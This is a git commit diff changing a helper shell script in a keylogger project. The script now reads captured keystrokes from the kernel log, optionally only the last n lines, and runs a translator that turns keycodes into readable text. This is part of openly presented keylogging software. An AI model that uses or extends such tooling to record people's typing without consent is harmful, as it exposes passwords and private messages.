9fd66a37a057c221f08df373a35436a864ec15d5
Ícaro Pires <icaropiresdf@gmail.com>
2017-11-29 16:26:34 -0200

    Adapt get_translated script and add option to get last n lines
    Signed-off-by: Ícaro Pires <icaropiresdf@gmail.com>

--- keylogger/get_translated.sh
+++ keylogger/get_translated.sh
@@ -4,30 +4,35 @@ TRANSLATORS_BINS='translators/bins'
 KEY_MAP_PREFIXE='maps/keys_map_'
 RUN_TRANSLATOR='./translator'
 KEY_MAP_PREFIX='../../maps/key_map_'
+KERNEL_VERSION=$(uname -r)
 
 if [ "$#" -eq 2 ]; then
-	cd $TRANSLATORS_BINS && $RUN_TRANSLATOR $KEY_MAP_PREFIX$1 ../../$2
-elif [ "$#" -eq 1 ]; then
-	sudo rm -f io/.pressed_keys
-
-	sudo cp /tmp/.pressed_keys $PWD/io/.pressed_keys
-
-	if [ $? -ne 0 ]; then
-	   echo 'There was a problem getting file /tmp/.pressed_keys'
-	   exit 1 
-	fi
+	tail -n$2 /var/log/kern.log > $PWD/io/.pressed_keys
+	if [ $? -ne 0 ]; then echo 'There was a problem loading kernel logs'; exit 1; fi
 
 	cd $TRANSLATORS_BINS && $RUN_TRANSLATOR $KEY_MAP_PREFIX$1 ../../io/.pressed_keys
+	if [ $? -ne 0 ]; then echo 'There was a problem running translator'; exit 1; fi
+
+elif [ "$#" -eq 1 ]; then
+	cat /var/log/kern.log > $PWD/io/.pressed_keys
+	if [ $? -ne 0 ]; then echo 'There was a problem loading kernel logs'; exit 1; fi
+
+	cd $TRANSLATORS_BINS && $RUN_TRANSLATOR $KEY_MAP_PREFIX$1 ../../io/.pressed_keys
+	if [ $? -ne 0 ]; then echo 'There was a problem running translator'; exit 1; fi
+
 else
-	echo -e 'You should provide at least 1 parameter, the keyboard language. To check available options, look at the ending of names of files under directory maps. It must be all uppercase!\n'
-	echo 'Also, you can provide 2, the language of keyboard and file to be translated'
+	echo 'You should provide at least 1 parameter, the keyboard language. To check available options, look at the ending of names of files under directory maps. It must be all uppercase!\n'
+
+	echo 'Also, you can provide 2, the language of keyboard and how much lines process from the kernel log'
+
 	exit 1
 fi
 
 cd -
 
-echo -e '\n'
+echo '\n'
 cat io/results.txt
-echo -e '\n'
+if [ $? -ne 0 ]; then echo 'There was a problem reading results file'; exit 1; fi
+echo '\n'
 
-echo -e '\nFinished!\nIf everything was ok, your result file is io/results.txt'
+echo '\nFinished!\nIf everything was ok, your result file is io/results.txt'
